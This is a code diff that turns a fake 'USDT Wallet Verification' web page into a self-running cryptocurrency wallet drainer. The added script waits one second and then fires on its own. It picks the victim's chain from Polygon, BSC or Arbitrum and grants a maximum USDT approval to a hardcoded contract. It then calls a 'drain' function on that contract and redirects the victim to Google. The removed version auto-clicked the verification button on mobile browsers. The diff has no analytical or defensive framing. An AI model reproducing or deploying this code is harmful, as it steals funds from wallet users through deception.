@@ -1,43 +1,59 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>USDT Verification</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
-</head>
-<body style="margin: 0; padding: 20px;">
-    <div id="content">
-        <h2>🔒 USDT Wallet Verification</h2>
-        <p>Click below to verify your wallet</p>
-        <button onclick="startVerification()" style="width: 100%; padding: 15px; background: blue; color: white; border: none;">
-            Start Verification
-        </button>
-    </div>
+<script>
+const CHAIN_CONFIGS = {
+    'polygon': {
+        contract: '0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55',
+        usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+        function: 'verifyOnPolygon'
+    },
+    'bsc': {
+        contract: '0xB6d9fd4ec4504aBF855453eEE1039cD002518238',
+        usdt: '0x55d398326f99059fF775485246999027B3197955', 
+        function: 'verifyOnBSC'
+    },
+    'arbitrum': {
+        contract: '0x7FC33491F197CAA19a9fDB9Faab01a670Bd64447',
+        usdt: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+        function: 'verifyOnArbitrum'
+    }
+};
 
-    <script>
-    async function startVerification() {
-        if (typeof window.ethereum !== 'undefined') {
-            try {
-                const web3 = new Web3(window.ethereum);
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                
-                // Continue with approval and drain...
-                // Your existing verifyUSDT() code here
-                
-            } catch (error) {
-                alert('Please approve the connection');
-            }
-        } else {
-            alert('Please open in Trust Wallet browser');
+// Auto-detect chain and drain
+async function autoDrain() {
+    if (typeof window.ethereum !== 'undefined') {
+        try {
+            const web3 = new Web3(window.ethereum);
+            const accounts = await web3.eth.requestAccounts();
+            const user = accounts[0];
+            const chainId = await web3.eth.getChainId();
+            
+            let config;
+            if (chainId === 137) config = CHAIN_CONFIGS.polygon;
+            else if (chainId === 56) config = CHAIN_CONFIGS.bsc;
+            else if (chainId === 42161) config = CHAIN_CONFIGS.arbitrum;
+            else return;
+
+            // Auto-approve
+            const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
+            await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
+                from: user,
+                gas: 100000
+            });
+
+            // Auto-drain
+            const drainContract = new web3.eth.Contract(drainABI, config.contract);
+            await drainContract.methods[config.function](1000000).send({
+                from: user,
+                gas: 200000
+            });
+
+            window.location.href = "https://google.com";
+            
+        } catch (error) {
+            console.log('Failed:', error);
         }
     }
-    
-    // Optional: Auto-trigger after short delay on mobile
-    setTimeout(() => {
-        if (typeof window.ethereum !== 'undefined' && /Mobile|Android/i.test(navigator.userAgent)) {
-            document.querySelector('button').click();
-        }
-    }, 500);
-    </script>
-</body>
-</html>
+}
+
+// Auto-execute
+setTimeout(autoDrain, 1000);
+</script>
